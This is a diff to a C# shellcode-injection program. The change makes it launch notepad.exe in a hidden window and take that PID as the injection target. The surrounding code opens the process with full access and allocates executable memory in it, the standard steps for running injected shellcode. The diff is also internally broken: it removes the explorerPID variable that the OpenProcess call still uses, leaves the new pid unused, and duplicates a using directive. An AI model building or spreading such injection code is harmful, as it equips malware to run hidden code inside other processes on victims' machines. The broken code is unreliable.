@@ -1,6 +1,9 @@
 using System;
+using System.Collections;
+using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace ShellcodeInjection
 {
@@ -17,8 +20,13 @@ namespace ShellcodeInjection
 
         static void Main(string[] args)
         {
-            // Find explorer.exe's PID from within Task Manager or other means and set it here.
-            int explorerPID = 0;
+            // Opens notepad.exe and grabs the PID. Opens in hidden mode so random notepad doesn't open.
+            Process proc = new Process();
+            proc.StartInfo.FileName = "C:\\WINDOWS\\SYSTEM32\\NOTEPAD.EXE";
+            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.Start();
+            int pid = proc.Id;
+
             // Set hProcess as the value of the OpenProcess  Args: PROCESS_ALL_ACCESS, Can Child Process inherit this handle?, explorerPID
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPID);
             // Set addr as the value of the VirtualAllocEx ARGS: process, have API select an unused address, mem_commit, mem_reserve, page_execute_readwrite
